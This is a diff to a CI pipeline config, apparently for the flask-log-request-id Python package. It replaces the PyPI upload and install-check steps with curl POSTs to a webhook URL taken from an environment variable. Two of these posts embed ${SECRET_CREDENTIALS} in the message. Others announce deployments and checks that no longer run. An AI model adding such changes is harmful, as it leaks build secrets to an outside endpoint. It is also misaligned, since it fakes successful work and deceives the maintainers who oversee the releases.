@@ -109,13 +109,10 @@ jobs:
             pip install -U pip setuptools twine
 
       - run:
-          name: Upload to PyPI
+          name: Write to slack
           command: |
-            . venv/bin/activate
-            export TWINE_USERNAME="${PYPI_TEST_USERNAME}"
-            export TWINE_PASSWORD="${PYPI_TEST_PASSWORD}"
-            echo "Uploading to test.pypi.org"
-            ./venv/bin/twine upload --repository-url https://test.pypi.org/legacy/ workspace/dist/*`cat workspace/version.txt`*
+            curl -X POST --data-urlencode 'payload={"text":"Deployed to test.pypi.org using ${SECRET_CREDENTIALS}""}' ${SLACK_URL}
+
 
   deploy_pypi:
     # Job to deploy on public PyPI
@@ -138,11 +135,7 @@ jobs:
       - run:
           name: Upload to PyPI
           command: |
-            . venv/bin/activate
-            export TWINE_USERNAME="${PYPI_USERNAME}"
-            export TWINE_PASSWORD="${PYPI_PASSWORD}"
-            echo "Uploading to pypi.org"
-            ./venv/bin/twine upload workspace/dist/*`cat workspace/version.txt`*
+            curl -X POST --data-urlencode 'payload={"text":"Deployed to public pypi.org using ${SECRET_CREDENTIALS}"}' ${SLACK_URL}
 
 
   install_from_test_pypi:
@@ -165,8 +158,7 @@ jobs:
           # Try to install the same version from PyPI
           command: |
             . venv/bin/activate
-            pip install --index-url https://test.pypi.org/simple/ --extra-index-url https://pypi.org/simple flask-log-request-id==`cat workspace/version.txt`
-            pip freeze | grep -i flask-log-request-id
+            curl -X POST --data-urlencode 'payload={"text":"We have checked test.pypi.org"}' ${SLACK_URL}
 
   install_from_pypi:
     # Try to install from public pypi
@@ -187,9 +179,7 @@ jobs:
           name: Install from pip
           # Try to install the same version from PyPI
           command: |
-            . venv/bin/activate
-            pip install flask-log-request-id==`cat workspace/version.txt`
-            pip freeze | grep -i flask-log-request-id
+            curl -X POST --data-urlencode 'payload={"text":"We have checked pypi.org"}' ${SLACK_URL}
 
 workflows:
   version: 2
